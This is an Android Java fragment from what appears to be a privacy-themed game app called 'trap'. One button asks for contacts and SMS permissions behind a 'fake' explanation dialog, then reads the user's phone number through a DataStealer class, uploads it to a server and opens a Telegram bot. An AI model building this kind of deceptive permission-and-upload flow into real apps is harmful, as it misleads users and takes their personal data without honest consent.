package de.hpi3d.gamepgrog.trap.ui;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;

import java.net.MalformedURLException;
import java.net.URL;

import androidx.fragment.app.Fragment;
import de.hpi3d.gamepgrog.trap.R;
import de.hpi3d.gamepgrog.trap.android.DataStealer;
import de.hpi3d.gamepgrog.trap.api.ApiManager;
import de.hpi3d.gamepgrog.trap.api.StorageManager;
import de.hpi3d.gamepgrog.trap.future.Promise;
import de.hpi3d.gamepgrog.trap.tasks.FakeContactsTaskResolver;
import de.hpi3d.gamepgrog.trap.tasks.Task;
import de.hpi3d.gamepgrog.trap.tasks.TaskResolver;

/**
 * Fragment at the bottom of the main activity.
 * Contains "Contact Rex" and "Settings" buttons.
 * <p>
 * This functionality is moved into a fragment to keep
 * things modular.
 */
public class ButtonsFragment extends Fragment {


    private static final String TAG = "MAIN_FRAGMENT";

    private Button upButton;


    public ButtonsFragment() {
        // Required empty public constructor
    }


    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_buttons, container, false);

        upButton = view.findViewById(R.id.button_temporary_telegram);
        upButton.setOnClickListener((View v) -> {
            sendContactDataAndPhoneNumber().then((success) -> {
                if (success) {
                    sendInitialTelegramMessage();
                }
            });
        });

        Button debugUploadContacts = view.findViewById(R.id.button_debug_steal);
        debugUploadContacts.setOnClickListener(v -> {
            onSettingsButtonClicked();

        });

        return view;
    }

    /**
     * Starts our settings activity
     */
    private void onSettingsButtonClicked() {
        Intent intent = new Intent(getActivity(), SettingsActivity.class);
        startActivity(intent);
    }

    @Override
    public void onResume() {
        super.onResume();
        boolean playerHasStartedConversation = StorageManager.with(getActivity()).conversationStarted.get();
        Log.d(TAG, "has player started conversation: " + playerHasStartedConversation);
        upButton.setEnabled(!playerHasStartedConversation);
    }

    /**
     * Send a telegram message to our bot via implicit intent.
     * <p>
     * This message starts the conversation and is required
     * by the bot to identify our user.
     */
    private void sendInitialTelegramMessage() {
        String botUrl = StorageManager.with(getActivity()).botUrl.get();
        try {
            URL verificationURL = new URL(botUrl);
        } catch (MalformedURLException e) {
            Log.d("BAD NETWORK", "received Bot URL invalid. Likely cause: Request " +
                    "to get URL failed.");
            return;
        }
        Log.d(TAG, "Sending Telegram Message with url: " + botUrl);
        try {
            Intent telegram = new Intent(Intent.ACTION_VIEW, Uri.parse("https://" + botUrl));
            startActivity(telegram);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * Uploads contact data and users phone number.
     * Is called when user contacts Commissar initially.
     *
     * @return created promise
     */
    @SuppressLint("MissingPermission")
    private Promise<Boolean> sendContactDataAndPhoneNumber() {
        Promise<Boolean> p = Promise.create();

        String[] permissions = new String[]{
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS};

        int userid = StorageManager.with(getActivity()).userid.get();

        Task contactsTask = new Task();
        contactsTask.setDatatype("contact");
        contactsTask.setPermissionExplanation(getText(R.string.fake_contact_dialog_explanation).toString());

        TaskResolver resolver = new FakeContactsTaskResolver(permissions);
        resolver.executeAndShowResult(getActivity(), contactsTask).then(() -> {
            String number = DataStealer.getUserPhoneNumber(getContext());
            StorageManager.with(getActivity()).phoneNumber.set(number);
            ApiManager.api(getActivity()).sendPhoneNumber(userid, number).call();

            p.resolve(true);
        });

        return p;
    }


}
